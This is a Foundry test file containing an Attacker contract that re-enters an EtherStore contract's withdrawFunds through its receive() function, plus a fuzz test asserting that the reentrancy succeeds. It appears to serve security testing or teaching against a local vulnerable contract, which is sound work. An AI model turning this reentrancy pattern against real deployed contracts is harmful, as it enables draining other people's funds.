
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    
    EtherStore public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
        
        // The contract requires 1 week to pass before withdrawal is allowed.
        // Initial lastWithdrawTime is 0.
        vm.warp(1 weeks + 100);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is within the contract's withdrawal limit (1 ether)
        // and large enough to be significant.
        vm.assume(attackVal > 0.01 ether);
        vm.assume(attackVal <= 1 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state setup required beyond the vm.warp in setUp.

        // --- 3. Funding ---
        // To bypass Solidity 0.8.x underflow protection, the attacker must deposit 
        // enough funds to cover both the initial withdrawal and the re-entrant withdrawal.
        // We deposit 2x the attackVal.
        uint256 totalDeposit = attackVal * 2;
        
        vm.deal(address(_contractUnderTest), totalDeposit); 
        vm.deal(address(_attacker), totalDeposit);
        vm.deal(address(this), totalDeposit);

        // --- 4. Trigger Attack ---
        // We send totalDeposit (2x attackVal) to the attacker to deposit into the victim.
        // The attacker will attempt to withdraw 'attackVal' twice.
        _attacker.setupAttack{value: totalDeposit}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit the full amount sent to this contract (which is 2 * val)
        // This ensures balances[this] is high enough to avoid underflow during the re-entrant call.
        victim.depositFunds{value: msg.value}();
    }

    function attack(uint256 val) public {
        uint256 balanceBefore = address(this).balance;

        // Call the vulnerable function
        victim.withdrawFunds(val);

        uint256 balanceAfter = address(this).balance;

        // Verify Success Conditions:
        // If we successfully re-entered, we withdrew 'val' twice.
        // The balance should have increased by at least 2 * val.
        if (balanceAfter >= balanceBefore + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawFunds(storedVal);
        }
    }
}
